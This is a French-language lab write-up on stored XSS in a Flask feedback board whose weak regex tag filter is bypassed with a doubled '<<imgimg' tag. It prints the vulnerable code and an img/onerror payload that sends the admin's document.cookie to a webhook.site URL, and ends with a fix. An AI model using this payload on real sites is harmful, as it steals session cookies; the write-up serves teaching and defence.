Jour 1 / Lab 1

Stored XSS Avec Un Filtre Faible

Ce lab utilise un tableau de feedback qui essaie de supprimer le HTML dangereux avant d’enregistrer les commentaires. Le filtre semble utile au premier regard, mais il se contourne facilement parce que l’application continue de rendre le contenu comme du HTML de confiance.

Rappel rapide sur le XSS

Le XSS réfléchi apparaît quand une entrée contrôlée par l’attaquant est renvoyée immédiatement dans la réponse. En général, la victime doit cliquer sur un lien piégé ou soumettre une requête préparée.

Le XSS stocké apparaît quand l’entrée contrôlée par l’attaquant est enregistrée, puis affichée plus tard à d’autres utilisateurs. Dans ce lab, c’est un XSS stocké parce que les commentaires restent en base et s’exécutent quand l’admin ouvre la page.

D’où vient la vulnérabilité

Le problème n’est pas seulement le filtre. Le filtre est faible, puis la sortie est rendue avec |safe. Donc tout payload qui survit au filtre est traité comme du vrai HTML.

def weak_tag_filter(content):
    return re.sub(
        r'<(script|img|svg|iframe|body|video|details)',
        '',
        content,
        flags=re.IGNORECASE,
    )

@app.route('/board', methods=['GET', 'POST'])
def board():
    if request.method == 'POST':
        content = weak_tag_filter(request.form['content'])
        conn.execute(
            "INSERT INTO comments (username, content, created_at) VALUES (?, ?, ?)",
            (user['username'], content, datetime.now().strftime('%Y-%m-%d %H:%M'))
        )
<div>{{ c.content | safe }}</div>

Comment le bypass fonctionne

Un payload normal comme celui ci-dessous est cassé par le filtre, donc il ne crée pas un élément HTML valide.

Payload normal

<img src=x onerror=fetch('https://webhook.site/your-id?c='+document.cookie)>

Après le filtre

src=x onerror=fetch('https://webhook.site/your-id?c='+document.cookie)>

Le bypass fonctionne en ajoutant un chevron ouvrant supplémentaire et en répétant le nom de la balise. La regex supprime le deuxième <img et laisse le premier <, ce qui reconstruit une balise valide.

Payload de bypass

<<imgimg src=x onerror=fetch('https://webhook.site/your-id?c='+document.cookie)>

Après le filtre

<img src=x onerror=fetch('https://webhook.site/your-id?c='+document.cookie)>

Quand l’admin visite le board, le navigateur rend ce commentaire stocké comme un élément image, le chargement échoue, et onerror envoie le cookie vers votre webhook.

Correctif

Il faut retirer |safe pour que Jinja échappe le contenu utilisateur par défaut. Si l’application a vraiment besoin d’un peu de HTML, il faut utiliser une sanitization par allowlist au lieu d’une regex.
